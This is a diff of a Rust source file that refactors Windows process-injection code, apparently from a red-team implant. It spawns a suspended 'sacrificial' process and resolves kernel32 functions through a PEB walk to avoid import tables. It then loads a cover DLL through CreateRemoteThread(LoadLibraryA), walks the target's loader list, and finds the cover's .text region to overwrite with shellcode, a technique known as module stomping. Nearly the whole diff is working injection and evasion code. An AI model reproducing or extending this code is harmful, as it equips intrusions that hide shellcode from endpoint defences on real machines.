@@ -150,23 +150,36 @@ impl Drop for SacrificialProcess {
 /// context. The returned struct owns both handles: dropping it closes them
 /// (and terminates a never-resumed process).
 pub unsafe fn create_sacrificial(spawn_to: &str) -> Result<SacrificialProcess, &'static str> {
-    type CreateProcessW = unsafe extern "system" fn(
-        *const u16,  // lpApplicationName
-        *mut u16,    // lpCommandLine (mutable per Win32)
-        *mut c_void, // lpProcessAttributes
-        *mut c_void, // lpThreadAttributes
-        i32,         // bInheritHandles
-        u32,         // dwCreationFlags
-        *mut c_void, // lpEnvironment
-        *const u16,  // lpCurrentDirectory
-        *mut u8,     // lpStartupInfo (raw bytes, STARTUPINFOW)
-        *mut u8,     // lpProcessInformation (raw bytes, PROCESS_INFORMATION)
-    ) -> i32;
+    let create_proc = unsafe { create_sacrificial_resolve() }?;
+    let (mut cmd, mut si, mut pi) = create_sacrificial_buffers(spawn_to);
+    unsafe { create_sacrificial_spawn(create_proc, &mut cmd, &mut si, &mut pi) }
+}
 
+/// `CreateProcessW` (kernel32) — resolved via PEB walk for the sacrificial
+/// process spawn.
+type CreateProcessW = unsafe extern "system" fn(
+    *const u16,  // lpApplicationName
+    *mut u16,    // lpCommandLine (mutable per Win32)
+    *mut c_void, // lpProcessAttributes
+    *mut c_void, // lpThreadAttributes
+    i32,         // bInheritHandles
+    u32,         // dwCreationFlags
+    *mut c_void, // lpEnvironment
+    *const u16,  // lpCurrentDirectory
+    *mut u8,     // lpStartupInfo (raw bytes, STARTUPINFOW)
+    *mut u8,     // lpProcessInformation (raw bytes, PROCESS_INFORMATION)
+) -> i32;
+
+/// Resolve + transmute `CreateProcessW` from kernel32.
+unsafe fn create_sacrificial_resolve() -> Result<CreateProcessW, &'static str> {
     let cp_addr =
         export_addr(b"kernel32.dll", b"CreateProcessW").ok_or("CreateProcessW unresolved")?;
-    let create_proc: CreateProcessW = core::mem::transmute(cp_addr);
+    Ok(core::mem::transmute(cp_addr))
+}
 
+/// Build the UTF-16 command line from `spawn_to` (mutable buffer Win32 wants)
+/// plus the zeroed STARTUPINFOW / PROCESS_INFORMATION buffers.
+fn create_sacrificial_buffers(spawn_to: &str) -> (crate::heap::Vec<u16>, [u8; 104], [u8; 24]) {
     // Build a UTF-16 command line from spawn_to (mutable buffer Win32 wants).
     let mut cmd = crate::heap::vec![0u16; spawn_to.len() + 1];
     for (i, b) in spawn_to.as_bytes().iter().enumerate() {
@@ -176,8 +189,19 @@ pub unsafe fn create_sacrificial(spawn_to: &str) -> Result<SacrificialProcess, &
     let mut si = [0u8; 104];
     si[0..4].copy_from_slice(&104u32.to_le_bytes());
     // PROCESS_INFORMATION: two handles + pid + tid = 24 bytes on x64.
-    let mut pi = [0u8; 24];
+    let pi = [0u8; 24];
+    (cmd, si, pi)
+}
 
+/// Spawn `spawn_to` suspended (CREATE_SUSPENDED, no environment, no current
+/// dir) and parse PROCESS_INFORMATION into the Drop-guarded
+/// [`SacrificialProcess`].
+unsafe fn create_sacrificial_spawn(
+    create_proc: CreateProcessW,
+    cmd: &mut [u16],
+    si: &mut [u8; 104],
+    pi: &mut [u8; 24],
+) -> Result<SacrificialProcess, &'static str> {
     // CREATE_SUSPENDED (0x4). No environment, no current dir.
     const CREATE_SUSPENDED: u32 = 0x4;
     let ok = unsafe {
@@ -375,6 +399,35 @@ unsafe fn remote_load_library(
     h: *mut core::ffi::c_void,
     dll: &[u8],
 ) -> Result<usize, &'static str> {
+    let fns = unsafe { remote_load_library_resolve() }?;
+    let remote_path = unsafe { remote_load_library_alloc_path(&fns, h, dll) }?;
+    let exit_code = unsafe { remote_load_library_run_thread(&fns, h, remote_path) }?;
+    // 6. Free the remote path buffer.
+    let _ = unsafe { (fns.vfx)(h, remote_path, 0, 0x8000) };
+    let name = &dll[..dll.len() - 1]; // strip the trailing NUL
+    if let Some(base) = unsafe { remote_module_base(h, name) } {
+        return Ok(base);
+    }
+    if exit_code == 0 {
+        return Err("LoadLibraryA returned NULL (cover load failed / blocked)");
+    }
+    Ok(exit_code as usize)
+}
+
+/// The kernel32 exports resolved once per remote load.
+struct RemoteLoadFns {
+    vax: VirtualAllocEx,
+    vfx: VirtualFreeEx,
+    crt: CreateRemoteThread,
+    wait: WaitForSingleObject,
+    get_exit: GetExitCodeThread,
+    close: CloseHandle,
+    wpm: WriteProcessMemory,
+    load_lib: usize,
+}
+
+/// Resolve + transmute the kernel32 exports the remote-load path needs.
+unsafe fn remote_load_library_resolve() -> Result<RemoteLoadFns, &'static str> {
     let vax: VirtualAllocEx = core::mem::transmute(
         export_addr(b"kernel32.dll", b"VirtualAllocEx").ok_or("VirtualAllocEx")?,
     );
@@ -396,11 +449,30 @@ unsafe fn remote_load_library(
         export_addr(b"kernel32.dll", b"WriteProcessMemory").ok_or("WriteProcessMemory")?,
     );
     let load_lib = export_addr(b"kernel32.dll", b"LoadLibraryA").ok_or("LoadLibraryA")?;
+    Ok(RemoteLoadFns {
+        vax,
+        vfx,
+        crt,
+        wait,
+        get_exit,
+        close,
+        wpm,
+        load_lib,
+    })
+}
 
+/// Steps 1-2: allocate a remote page for the DLL path string and write the
+/// path into it. Returns the remote allocation; on a write failure the
+/// allocation is freed here.
+unsafe fn remote_load_library_alloc_path(
+    fns: &RemoteLoadFns,
+    h: *mut core::ffi::c_void,
+    dll: &[u8],
+) -> Result<*mut core::ffi::c_void, &'static str> {
     // 1. Allocate a remote page for the DLL path string.
     let path_len = dll.len(); // includes the NUL
     let remote_path = unsafe {
-        vax(
+        (fns.vax)(
             h,
             core::ptr::null(),
             path_len,
@@ -413,21 +485,32 @@ unsafe fn remote_load_library(
     }
     // 2. Write the DLL path into the remote allocation.
     let mut written: usize = 0;
-    let w_ok = unsafe { wpm(h, remote_path, dll.as_ptr(), path_len, &mut written) };
+    let w_ok = unsafe { (fns.wpm)(h, remote_path, dll.as_ptr(), path_len, &mut written) };
     if w_ok == 0 {
         unsafe {
-            let _ = vfx(h, remote_path, 0, 0x8000 /* RELEASE */);
+            let _ = (fns.vfx)(h, remote_path, 0, 0x8000 /* RELEASE */);
         }
         return Err("WriteProcessMemory (path)");
     }
+    Ok(remote_path)
+}
+
+/// Steps 3-5: fire CreateRemoteThread(LoadLibraryA, remote_path), wait for
+/// LoadLibraryA to complete in the target, then read the thread exit code
+/// (the truncated HMODULE) and close the thread handle. Returns the exit code.
+unsafe fn remote_load_library_run_thread(
+    fns: &RemoteLoadFns,
+    h: *mut core::ffi::c_void,
+    remote_path: *mut core::ffi::c_void,
+) -> Result<u32, &'static str> {
     // 3. CreateRemoteThread(LoadLibraryA, remote_path). LoadLibraryA's address
     //    is valid remotely on the same OS build (kernel32 is mapped at a
     //    system-wide base; LoadLibraryA's RVA is identical). The thread's exit
     //    code == the loaded module handle (HMODULE) on success.
     type ThreadProc = unsafe extern "system" fn(*mut core::ffi::c_void) -> u32;
-    let load_lib_proc: ThreadProc = unsafe { core::mem::transmute(load_lib) };
+    let load_lib_proc: ThreadProc = unsafe { core::mem::transmute(fns.load_lib) };
     let th = unsafe {
-        crt(
+        (fns.crt)(
             h,
             0,
             0,
@@ -438,11 +521,11 @@ unsafe fn remote_load_library(
         )
     };
     if th.is_null() {
-        let _ = unsafe { vfx(h, remote_path, 0, 0x8000) };
+        let _ = unsafe { (fns.vfx)(h, remote_path, 0, 0x8000) };
         return Err("CreateRemoteThread");
     }
     // 4. Wait for LoadLibraryA to complete (it runs in the target).
-    let _ = unsafe { wait(th, 10_000) };
+    let _ = unsafe { (fns.wait)(th, 10_000) };
     // 5. Recover the cover DLL's REAL 64-bit remote base. The thread exit
     //    code is a DWORD, so GetExitCodeThread truncates the HMODULE to its
     //    low 32 bits — on x64 the cover loads above 4GB and the truncated
@@ -452,18 +535,9 @@ unsafe fn remote_load_library(
     //    the module by name instead; the truncated exit code remains only
     //    as a last-resort fallback.
     let mut exit_code: u32 = 0;
-    let _ = unsafe { get_exit(th, &mut exit_code) };
-    let _ = unsafe { close(th) };
-    // 6. Free the remote path buffer.
-    let _ = unsafe { vfx(h, remote_path, 0, 0x8000) };
-    let name = &dll[..dll.len() - 1]; // strip the trailing NUL
-    if let Some(base) = unsafe { remote_module_base(h, name) } {
-        return Ok(base);
-    }
-    if exit_code == 0 {
-        return Err("LoadLibraryA returned NULL (cover load failed / blocked)");
-    }
-    Ok(exit_code as usize)
+    let _ = unsafe { (fns.get_exit)(th, &mut exit_code) };
+    let _ = unsafe { (fns.close)(th) };
+    Ok(exit_code)
 }
 
 /// Walk the target's loader list (PEB → Ldr → InLoadOrderModuleList) and
@@ -478,36 +552,86 @@ unsafe fn remote_load_library(
 ///
 /// Returns None if the PEB can't be read or the module isn't found.
 unsafe fn remote_module_base(h: *mut core::ffi::c_void, name: &[u8]) -> Option<usize> {
-    type NtQueryInformationProcess = unsafe extern "system" fn(
-        *mut core::ffi::c_void, // ProcessHandle
-        u32,                    // ProcessInformationClass
-        *mut core::ffi::c_void, // ProcessInformation
-        u32,                    // ProcessInformationLength
-        *mut u32,               // ReturnLength
-    ) -> i32;
     let rpm: ReadProcessMemory =
         core::mem::transmute(export_addr(b"kernel32.dll", b"ReadProcessMemory")?);
     let nqip: NtQueryInformationProcess =
         core::mem::transmute(export_addr(b"ntdll.dll", b"NtQueryInformationProcess")?);
-    // Small helper: read exactly `buf.len()` remote bytes; None on short read.
-    let read = |addr: usize, buf: &mut [u8]| -> Option<()> {
-        let mut got: usize = 0;
-        let ok = unsafe {
-            rpm(
-                h,
-                addr as *const _,
-                buf.as_mut_ptr() as *mut _,
-                buf.len(),
-                &mut got,
-            )
-        };
-        if ok == 0 || got != buf.len() {
-            None
-        } else {
-            Some(())
+    let ldr = unsafe { remote_module_base_ldr(h, rpm, nqip) }?;
+    // InLoadOrderModuleList head at +0x10 (the sentinel == the list head).
+    let mut ptr = [0u8; 8];
+    unsafe { remote_read(h, rpm, ldr + 0x10, &mut ptr) }?;
+    let sentinel = ldr + 0x10;
+    let mut link = u64::from_le_bytes(ptr) as usize;
+    // LDR_DATA_TABLE_ENTRY (x64): InLoadOrderLinks +0x00, DllBase +0x30,
+    // BaseDllName (UNICODE_STRING) +0x58 → Length u16 @+0x58, Buffer @+0x60.
+    for _ in 0..512 {
+        if link == 0 || link == sentinel {
+            return None;
         }
-    };
+        let mut entry = [0u8; 0x68];
+        unsafe { remote_read(h, rpm, link, &mut entry) }?;
+        let dll_base = u64::from_le_bytes([
+            entry[0x30], entry[0x31], entry[0x32], entry[0x33], entry[0x34], entry[0x35],
+            entry[0x36], entry[0x37],
+        ]) as usize;
+        let name_len = u16::from_le_bytes([entry[0x58], entry[0x59]]) as usize;
+        let name_buf = u64::from_le_bytes([
+            entry[0x60], entry[0x61], entry[0x62], entry[0x63], entry[0x64], entry[0x65],
+            entry[0x66], entry[0x67],
+        ]) as usize;
+        if name_len / 2 == name.len() && name_buf != 0 && name_len <= 520 {
+            let mut wname = [0u8; 520];
+            unsafe { remote_read(h, rpm, name_buf, &mut wname[..name_len]) }?;
+            if remote_module_base_name_matches(name, &wname) {
+                return Some(dll_base);
+            }
+        }
+        link = u64::from_le_bytes([
+            entry[0], entry[1], entry[2], entry[3], entry[4], entry[5], entry[6], entry[7],
+        ]) as usize;
+    }
+    None
+}
 
+type NtQueryInformationProcess = unsafe extern "system" fn(
+    *mut core::ffi::c_void, // ProcessHandle
+    u32,                    // ProcessInformationClass
+    *mut core::ffi::c_void, // ProcessInformation
+    u32,                    // ProcessInformationLength
+    *mut u32,               // ReturnLength
+) -> i32;
+
+/// Read exactly `buf.len()` remote bytes; None on short read.
+unsafe fn remote_read(
+    h: *mut core::ffi::c_void,
+    rpm: ReadProcessMemory,
+    addr: usize,
+    buf: &mut [u8],
+) -> Option<()> {
+    let mut got: usize = 0;
+    let ok = unsafe {
+        rpm(
+            h,
+            addr as *const _,
+            buf.as_mut_ptr() as *mut _,
+            buf.len(),
+            &mut got,
+        )
+    };
+    if ok == 0 || got != buf.len() {
+        None
+    } else {
+        Some(())
+    }
+}
+
+/// Read the target PEB (via NQIP ProcessBasicInformation) then the
+/// `PEB.Ldr` pointer at +0x18. Returns the Ldr pointer.
+unsafe fn remote_module_base_ldr(
+    h: *mut core::ffi::c_void,
+    rpm: ReadProcessMemory,
+    nqip: NtQueryInformationProcess,
+) -> Option<usize> {
     // ProcessBasicInformation (class 0): PebBaseAddress is the pointer-sized
     // field at offset 8 of the 48-byte PROCESS_BASIC_INFORMATION.
     let mut pbi = [0u8; 48];
@@ -522,51 +646,25 @@ unsafe fn remote_module_base(h: *mut core::ffi::c_void, name: &[u8]) -> Option<u
     }
     // PEB.Ldr at +0x18 → PEB_LDR_DATA; InLoadOrderModuleList head at +0x10.
     let mut ptr = [0u8; 8];
-    read(peb + 0x18, &mut ptr)?;
+    if unsafe { remote_read(h, rpm, peb + 0x18, &mut ptr) }.is_none() {
+        return None;
+    }
     let ldr = u64::from_le_bytes(ptr) as usize;
     if ldr == 0 {
         return None;
     }
-    read(ldr + 0x10, &mut ptr)?;
-    let sentinel = ldr + 0x10;
-    let mut link = u64::from_le_bytes(ptr) as usize;
-    // LDR_DATA_TABLE_ENTRY (x64): InLoadOrderLinks +0x00, DllBase +0x30,
-    // BaseDllName (UNICODE_STRING) +0x58 → Length u16 @+0x58, Buffer @+0x60.
-    for _ in 0..512 {
-        if link == 0 || link == sentinel {
-            return None;
+    Some(ldr)
+}
+
+/// Case-insensitive ASCII compare of `name` against the UTF-16 `wname` bytes.
+fn remote_module_base_name_matches(name: &[u8], wname: &[u8]) -> bool {
+    for (i, &b) in name.iter().enumerate() {
+        let wc = u16::from_le_bytes([wname[i * 2], wname[i * 2 + 1]]);
+        if wc > 0xFF || (wc as u8).to_ascii_lowercase() != b.to_ascii_lowercase() {
+            return false;
         }
-        let mut entry = [0u8; 0x68];
-        read(link, &mut entry)?;
-        let dll_base = u64::from_le_bytes([
-            entry[0x30], entry[0x31], entry[0x32], entry[0x33], entry[0x34], entry[0x35],
-            entry[0x36], entry[0x37],
-        ]) as usize;
-        let name_len = u16::from_le_bytes([entry[0x58], entry[0x59]]) as usize;
-        let name_buf = u64::from_le_bytes([
-            entry[0x60], entry[0x61], entry[0x62], entry[0x63], entry[0x64], entry[0x65],
-            entry[0x66], entry[0x67],
-        ]) as usize;
-        if name_len / 2 == name.len() && name_buf != 0 && name_len <= 520 {
-            let mut wname = [0u8; 520];
-            read(name_buf, &mut wname[..name_len])?;
-            let mut matched = true;
-            for (i, &b) in name.iter().enumerate() {
-                let wc = u16::from_le_bytes([wname[i * 2], wname[i * 2 + 1]]);
-                if wc > 0xFF || (wc as u8).to_ascii_lowercase() != b.to_ascii_lowercase() {
-                    matched = false;
-                    break;
-                }
-            }
-            if matched {
-                return Some(dll_base);
-            }
-        }
-        link = u64::from_le_bytes([
-            entry[0], entry[1], entry[2], entry[3], entry[4], entry[5], entry[6], entry[7],
-        ]) as usize;
     }
-    None
+    true
 }
 
 /// The REAL remote .text region: read the cover DLL's PE headers from the
@@ -583,6 +681,30 @@ unsafe fn remote_text_region(
         export_addr(b"kernel32.dll", b"ReadProcessMemory").ok_or("ReadProcessMemory")?,
     );
     // Read the DOS header (first 64 bytes) to get e_lfanew.
+    let e_lfanew = unsafe { remote_text_region_dos_header(h, rpm, cover_base) }?;
+    // Read the NT headers (24-byte signature + FileHeader) to get section count
+    // + size of optional header.
+    let nt_off = cover_base + e_lfanew;
+    let (num_sections, size_opt_hdr) =
+        unsafe { remote_text_region_nt_headers(h, rpm, nt_off) }?;
+    let sections_off = nt_off + 24 + size_opt_hdr;
+    // Scan the section headers (40 bytes each) for ".text".
+    for i in 0..num_sections {
+        if let Some(region) = unsafe {
+            remote_text_region_section(h, rpm, cover_base, sections_off + i * 40)
+        } {
+            return Ok(region);
+        }
+    }
+    Err("remote cover: .text section not found")
+}
+
+/// Read the DOS header (first 64 bytes) to get e_lfanew.
+unsafe fn remote_text_region_dos_header(
+    h: *mut core::ffi::c_void,
+    rpm: ReadProcessMemory,
+    cover_base: usize,
+) -> Result<usize, &'static str> {
     let mut dos = [0u8; 64];
     let mut got: usize = 0;
     if unsafe {
@@ -601,13 +723,19 @@ unsafe fn remote_text_region(
     if dos[0] != b'M' || dos[1] != b'Z' {
         return Err("remote cover: bad MZ");
     }
-    let e_lfanew = i32::from_le_bytes([dos[60], dos[61], dos[62], dos[63]]) as usize;
-    // Read the NT headers (24-byte signature + FileHeader) to get section count
-    // + size of optional header. We need bytes 6..8 (NumSections) and 20..22
-    // (SizeOfOptionalHeader) of the COFF header (which follows the 4-byte sig).
-    let nt_off = cover_base + e_lfanew;
+    Ok(i32::from_le_bytes([dos[60], dos[61], dos[62], dos[63]]) as usize)
+}
+
+/// Read the NT headers (24-byte signature + FileHeader) to get section count
+/// + size of optional header. We need bytes 6..8 (NumSections) and 20..22
+/// (SizeOfOptionalHeader) of the COFF header (which follows the 4-byte sig).
+unsafe fn remote_text_region_nt_headers(
+    h: *mut core::ffi::c_void,
+    rpm: ReadProcessMemory,
+    nt_off: usize,
+) -> Result<(usize, usize), &'static str> {
     let mut nt = [0u8; 24];
-    got = 0;
+    let mut got: usize = 0;
     if unsafe {
         rpm(
             h,
@@ -626,38 +754,44 @@ unsafe fn remote_text_region(
     }
     let num_sections = u16::from_le_bytes([nt[6], nt[7]]) as usize;
     let size_opt_hdr = u16::from_le_bytes([nt[20], nt[21]]) as usize;
-    let sections_off = nt_off + 24 + size_opt_hdr;
-    // Scan the section headers (40 bytes each) for ".text".
-    for i in 0..num_sections {
-        let mut sec = [0u8; 40];
-        got = 0;
-        let sec_off = sections_off + i * 40;
-        if unsafe {
-            rpm(
-                h,
-                sec_off as *const _,
-                sec.as_mut_ptr() as *mut _,
-                40,
-                &mut got,
-            )
-        } == 0
-            || got != 40
-        {
-            continue; // skip unreadable section
-        }
-        if &sec[0..5] == b".text" {
-            let vsize = u32::from_le_bytes([sec[8], sec[9], sec[10], sec[11]]) as usize;
-            let vaddr = u32::from_le_bytes([sec[12], sec[13], sec[14], sec[15]]) as usize;
-            // Cap the stomp region to a sane max (never overwrite a huge .text
-            // if the shellcode is tiny) — use min(section size, 0x2000).
-            let len = vsize.min(0x2000);
-            return Ok(RemoteRegion {
-                base: cover_base + vaddr,
-                len,
-            });
-        }
+    Ok((num_sections, size_opt_hdr))
+}
+
+/// Read one 40-byte section header; Some(region) when it is ".text".
+unsafe fn remote_text_region_section(
+    h: *mut core::ffi::c_void,
+    rpm: ReadProcessMemory,
+    cover_base: usize,
+    sec_off: usize,
+) -> Option<RemoteRegion> {
+    let mut sec = [0u8; 40];
+    let mut got: usize = 0;
+    if unsafe {
+        rpm(
+            h,
+            sec_off as *const _,
+            sec.as_mut_ptr() as *mut _,
+            40,
+            &mut got,
+        )
+    } == 0
+        || got != 40
+    {
+        return None; // skip unreadable section
     }
-    Err("remote cover: .text section not found")
+    if &sec[0..5] == b".text" {
+        let vsize = u32::from_le_bytes([sec[8], sec[9], sec[10], sec[11]]) as usize;
+        let vaddr = u32::from_le_bytes([sec[12], sec[13], sec[14], sec[15]]) as usize;
+        // Cap the stomp region to a sane max (never overwrite a huge .text
+        // if the shellcode is tiny) — use min(section size, 0x2000).
+        let len = vsize.min(0x2000);
+        Some(RemoteRegion {
+            base: cover_base + vaddr,
+            len,
+        })
+    } else {
+        None
+    }
 }
 
 struct RemoteRegion {
